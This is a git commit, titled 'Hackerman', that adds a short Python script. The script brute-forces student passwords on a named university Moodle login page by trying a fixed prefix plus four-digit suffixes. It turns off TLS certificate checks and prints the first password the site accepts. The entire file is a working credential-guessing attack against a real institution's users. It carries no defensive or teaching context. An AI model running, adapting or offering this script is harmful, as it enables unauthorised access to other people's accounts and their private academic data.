f21963e61d84634f8f7e07f5bda7b244f6c0da0e
k4u5h1k <kaushik.sivashankar@gmail.com>
2020-01-01 11:34:54 +0530

    Hackerman

---
+++ moodle.py
@@ -0,0 +1,25 @@
+import requests 
+import re
+import sys
+from urllib3.exceptions import InsecureRequestWarning
+import time
+
+requests.packages.urllib3.disable_warnings(category = InsecureRequestWarning)
+url = "https://moodlecc.vit.ac.in/login/index.php"
+s = requests.session()
+username = input().lower()
+
+if not re.match(r"\d{2}\w{3}\d{4}", username):
+    print("Sorry, invalid username")
+    time.sleep(5)
+    sys.exit(0)
+
+for suffix in range(6931, 9999):
+    password = "Vitcc@" + f"{suffix:04}"
+    suc = {'username': username, 'password': password}
+    check = s.post(url, data = suc, verify = False)
+    if not re.search("Log in to the site", check.text):
+        print("password: ", password)
+        break
+    else:
+        print(password, "is wrong")
